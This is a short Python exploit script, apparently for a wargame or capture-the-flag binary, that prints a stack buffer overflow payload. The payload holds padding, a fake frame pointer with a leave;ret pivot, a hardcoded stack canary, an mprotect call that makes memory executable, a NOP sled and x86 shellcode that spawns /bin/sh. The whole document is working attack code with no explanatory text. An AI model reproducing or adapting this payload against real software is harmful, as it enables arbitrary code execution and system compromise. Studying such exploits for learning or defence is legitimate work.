import os
from struct import *
from socket import *
from time import sleep

p = lambda x: pack('<L', x)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
stdin		= 0xb7ff7000
fake_ebp 	= 0xb7ff710c
mprotect 	= 0x0086d240
canary		= 0x00031337
leave_ret	= 0x0804858e

payload = ""
payload += "A"*256
payload += "A"*4
payload += p(fake_ebp) + p(leave_ret) + p(canary)
payload += p(mprotect) + p(fake_ebp+100)
payload += p(stdin) + p(0x00000800) + p(0x00000007)
payload += "\x90"*256 + shellcode

print payload
